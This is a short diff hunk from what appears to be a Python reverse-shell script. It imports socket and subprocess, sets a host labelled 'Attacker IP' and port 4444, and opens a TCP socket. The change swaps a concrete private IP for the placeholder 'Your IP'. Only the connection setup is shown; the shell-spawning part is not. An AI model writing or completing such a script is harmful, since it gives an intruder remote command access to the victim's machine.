@@ -1,6 +1,6 @@
 import socket, subprocess
 
-HOST = '172.22.238.168'  # Attacker IP
+HOST = 'Your IP'  # Attacker IP
 PORT = 4444              # Attacker port
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
